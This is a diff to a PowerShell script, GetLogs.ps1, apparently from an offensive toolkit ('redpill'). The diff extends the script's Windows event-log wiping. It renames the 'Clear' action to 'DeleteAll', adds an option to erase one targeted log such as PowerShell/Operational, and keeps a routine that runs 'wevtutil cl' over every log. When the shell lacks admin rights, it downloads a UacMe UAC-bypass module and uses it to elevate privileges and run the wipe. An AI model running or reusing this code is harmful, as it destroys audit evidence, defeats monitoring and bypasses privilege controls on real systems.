@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: wevtutil
-   PS cmdlet Dev version: v1.4.15
+   PS cmdlet Dev version: v1.5.16
 
 .DESCRIPTION
    This cmdlet displays a list of ALL eventvwr categorie entrys and there
@@ -24,7 +24,7 @@
    then this cmdlet will scan pre-defined event paths and ID's numbers!
 
 .Parameter GetLogs
-   Accepts arguments: Enum, Verbose, Yara, Clear
+   Accepts arguments: Enum, Verbose, Yara, DeleteAll
 
 .Parameter NewEst
    How many event logs to display int value (default: 3)
@@ -68,8 +68,12 @@
    List newest 3 (default) logfiles of 'NetworkProfile/Operational' categorie with Id: 10001
 
 .EXAMPLE
-   PS C:\> .\GetLogs.ps1 -GetLogs Clear
+   PS C:\> .\GetLogs.ps1 -GetLogs DeleteAll
    Remark: Clear function requires Administrator privileges!
+
+.EXAMPLE
+   PS C:\> .\GetLogs.ps1 -GetLogs DeleteAll -Verb "Microsoft-Windows-Powershell/Operational"
+   Delete only logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
 
 .INPUTS
    None. You cannot pipe objects to GetLogs.ps1
@@ -142,15 +146,16 @@ If($GetLogs -ieq "Enum"){
    #>
 
 
+   $regex = "system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational"
    ## List Major event logs categories and the number of entries!
    # [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
    Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object {
-      $_.LogName -iMatch '^(system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational)$'
-   } | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {## Print ForegroundColor as red if 0 entrys!
-       $stringformat = If($_ -Match '\s+(0)+\s+'){
-          @{ 'ForegroundColor' = 'Red' } }Else{ @{} }
-       Write-Host @stringformat $_
-    }
+      $_.LogName -iMatch "^($regex)$" } | Format-Table -AutoSize |
+         Out-String -Stream | ForEach-Object {
+            $stringformat = If($_ -Match '\s+(0)+\s+'){
+               @{ 'ForegroundColor' = 'Red' } }Else{ @{} }
+            Write-Host @stringformat $_
+         }
 
 }
 
@@ -200,16 +205,16 @@ If($GetLogs -ieq "Verbose"){
           600 Information PowerShell Engine state is changed from Available to Stopped. ... 
    #>
 
-
+   $regex = "system|application|windows powershell|HardwareEvents|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational"
    ## List Major event logs categories and the number of entries!
    # [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
    Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object {
-      $_.LogName -iMatch '(system|application|windows powershell|HardwareEvents|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational)$'
-   } | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
-       $stringformat = If($_ -iMatch '\s+(Windows PowerShell|application|system)\s+'){
-          @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
-       Write-Host @stringformat $_
-    }
+      $_.LogName -iMatch "($regex)$" } | Format-Table -AutoSize |
+         Out-String -Stream | ForEach-Object {
+            $stringformat = If($_ -iMatch '\s+(Windows PowerShell|application|system)\s+'){
+               @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
+            Write-Host @stringformat $_
+         }
 
    Start-Sleep -Seconds 1
    If($NewEst -lt "1" -or $NewEst -gt "80"){
@@ -506,7 +511,7 @@ If($GetLogs -ieq "Yara"){
 }
 
 
-If($GetLogs -ieq "Clear"){
+If($GetLogs -ieq "DeleteAll"){
 
    <#
    .SYNOPSIS
@@ -524,23 +529,25 @@ If($GetLogs -ieq "Clear"){
       to administrator to be abble to run 'wevtutil cl' cmdline!
 
    .Parameter GetLogs
-      Accepts argument: Clear
+      Accepts argument: DeleteAll
+
+   .Parameter Verb
+      Accepts 'ONE' Eventvwr registry path to be Cleanned!
 
    .EXAMPLE
-      PS C:\> .\GetLogs.ps1 -GetLogs Clear
+      PS C:\> .\GetLogs.ps1 -GetLogs DeleteAll
       Delete ALL logfiles from eventvwr snapIn!
+
+   .EXAMPLE
+      PS C:\> .\GetLogs.ps1 -GetLogs DeleteAll -Verb "Microsoft-Windows-Powershell/Operational"
+      Delete only logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
    #>
 
 
    If(-not($IsClientAdmin)){
 
       <#
-      .SYNOPSIS
-         Author: @r00t-3xp10it
-         Helper - Clear 'ALL' eventvwr logfiles using EOP!
-
       .NOTES
-         required dependencies: Administrator privileges! { EOP }
          This function only triggers under 'UserLand' privileges!
 
       .DESCRIPTION
@@ -549,15 +556,25 @@ If($GetLogs -ieq "Clear"){
          to be habble to delete ALL logfiles trougth EOP technic!
       #>
 
-
-      $RawPScript = "wevtutil el | Foreach-Object { wevtutil cl `"`$_`" }"
-      Write-Host "`n[error:] Shell - Administrator Privileges: False" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "`n[error:] Shell - administrator privileges required!" -ForegroundColor Red -BackgroundColor Black
       Write-Host "[bypass] Exec @redpill UacMe Module to elevate privs!" -ForegroundColor Yellow
       Start-Sleep -Seconds 1
 
+      If($Verb -ne "False"){## Define type of cleanning!
+
+         $regex = "$Verb"
+         $RawPScript = "wevtutil cl `"$Verb`""
+
+      }Else{## Clean ALL logfiles from eventvwr snapIn!
+
+         $RawPScript = "wevtutil el | Foreach-Object { wevtutil cl `"`$_`" }"
+         $regex = "system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational"
+
+      }
+
       ## create trigger.ps1 script into %tmp% directory!
       $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
-      echo "$RawPScript" | Out-File "$Env:TMP\$RandomMe.ps1" -encoding ascii -force
+      echo "$RawPScript" | Out-File "$Env:TMP\$RandomMe.ps1" -Encoding ascii -Force
 
       ## Download @UacMe from @redpill repository into %tmp%
       If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
@@ -567,6 +584,7 @@ If($GetLogs -ieq "Clear"){
             exit ## Exit @GetLogs
          }
       }
+
 
       ## Execute @UacMe that executes '$RandomMe.ps1' that executes 'wevtutil cl' cmdline!
       Write-Host "Cleaning ALL '$Env:COMPUTERNAME\$Env:USERNAME' Domain Eventvwr logfiles..";Start-Sleep -Seconds 1
@@ -585,31 +603,51 @@ If($GetLogs -ieq "Clear"){
       ## List Major event logs categories and the number of entries!
       # [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
       Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object {
-         $_.LogName -iMatch '^(system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational)$'
-      } | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {## Print ForegroundColor as Green if 0 entrys!
-          $stringformat = If($_ -Match '\s+(0|1)+\s+'){
-             @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
-          Write-Host @stringformat $_
-       }
+         $_.LogName -iMatch "^($regex)$" } | Format-Table -AutoSize |
+            Out-String -Stream | ForEach-Object {
+            $stringformat = If($_ -Match '\s+(0|1)+\s+'){
+               @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
+            Write-Host @stringformat $_
+          }
 
    }Else{
 
-      ## Clear ALL event Logs
-      Write-Host "[i] Administrator Privileges: True" -ForegroundColor Yellow
+      <#
+      .NOTES
+         This function only triggers under 'Administrator' privileges!
+
+      .DESCRIPTION
+         This function uses wevtutil to delete logs from ALL categories
+         or simple to delete all logfiles from user sellected categorie!
+      #>
+
+      ## Clear Event Logs
+      Write-Host "[i] Shell - administrator privileges: True" -ForegroundColor Yellow
       Write-Host "[+] Cleaning $Env:COMPUTERNAME\$Env:USERNAME Eventvwr logfiles ...`n" -ForeGroundColor Green
       ## wevtutil cl "Microsoft-Windows-Powershell/Operational"  ## Clean Powershell logfiles
       ## wevtutil cl "Microsoft-Windows-Bits-Client/Operational" ## Clean BITS-TRANSFER logfiles
-      wevtutil el | Foreach-Object { wevtutil cl "$_" }
+
+      If($Verb -ne "False"){## Define type of cleanning!
+
+         $regex = "$Verb"
+         wevtutil cl "$Verb"
+
+      }Else{## Clean ALL logfiles from eventvwr snapIn!
+
+         wevtutil el | Foreach-Object { wevtutil cl "$_" }
+         $regex = "system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational"
+
+      }
 
       ## List Major event logs categories and the number of entries!
       # [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
       Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object {
-         $_.LogName -iMatch '^(system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational)$'
-      } | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {## Print ForegroundColor as Green if 0 entrys!
-          $stringformat = If($_ -Match '\s+(0|1)+\s+'){
-             @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
-          Write-Host @stringformat $_
-       }
+         $_.LogName -iMatch "^($regex)$" } | Format-Table -AutoSize |
+            Out-String -Stream | ForEach-Object {
+               $stringformat = If($_ -Match '\s+(0|1)+\s+'){
+                  @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
+               Write-Host @stringformat $_
+            }
 
    }
 
